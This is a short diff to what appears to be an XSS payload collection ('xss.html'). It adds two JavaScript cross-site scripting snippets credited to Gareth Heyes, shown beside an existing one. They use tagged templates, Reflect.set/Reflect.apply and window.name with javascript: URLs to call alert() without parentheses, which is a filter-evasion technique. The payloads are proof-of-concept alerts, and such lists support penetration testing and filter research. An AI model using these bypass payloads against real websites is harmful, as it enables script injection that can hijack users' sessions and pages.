@@ -44,6 +44,19 @@ xss.html
 
 ---
 
+[Garethheyes](https://twitter.com/garethheyes/status/1560366908754501632?s=20&t=-p-EZTtcQqHBWZ_WKf6icA)
+
+    window.name='javascript:alert\x2823\x29';
+    Reflect.set.call`${location}${'href'}${name}`
+
+---
+
+[Garethheyes](https://twitter.com/garethheyes/status/1560348706137948162?s=20&t=-p-EZTtcQqHBWZ_WKf6icA)
+
+    Reflect.apply.call`${alert}${undefined}${[23]}`
+
+---
+
 [Garethheyes](https://twitter.com/garethheyes/status/1536796812073476097?s=20&t=dPlXor6lWkKtDil629FLJg)
 
     navigation.navigate`javascript:alert\x2823\x29`
